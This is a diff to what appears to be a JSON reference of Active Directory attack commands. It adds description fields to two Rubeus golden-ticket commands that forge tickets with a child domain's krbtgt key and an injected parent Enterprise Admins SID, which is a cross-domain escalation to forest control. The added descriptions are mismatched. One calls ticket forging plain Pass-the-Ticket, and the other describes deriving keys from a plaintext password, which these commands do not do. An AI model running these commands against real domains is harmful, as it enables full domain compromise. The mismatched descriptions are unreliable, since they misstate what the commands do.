@@ -217,11 +217,13 @@
   "variations": [
     {
       "label": "AES256 (stealthier than RC4)",
-      "command": ".\\Rubeus.exe golden /aes256:<child_krbtgt_aes> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /ptt"
+      "command": ".\\Rubeus.exe golden /aes256:<child_krbtgt_aes> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /ptt",
+      "description": "Uses Rubeus to perform Pass-the-Ticket - injects a Kerberos ticket into the current session for lateral movement or privilege escalation without knowing the plaintext password."
     },
     {
       "label": "Save ticket to file",
-      "command": ".\\Rubeus.exe golden /rc4:<child_krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /outfile:golden.kirbi"
+      "command": ".\\Rubeus.exe golden /rc4:<child_krbtgt_hash> /domain:<child_domain> /sid:<child_sid> /sids:<parent_ea_sid> /user:Administrator /outfile:golden.kirbi",
+      "description": "Uses Rubeus to compute Kerberos encryption keys (RC4/AES128/AES256) from a plaintext password. These keys are needed for forging tickets (golden/silver/diamond tickets)."
     }
   ],
   "steps": [
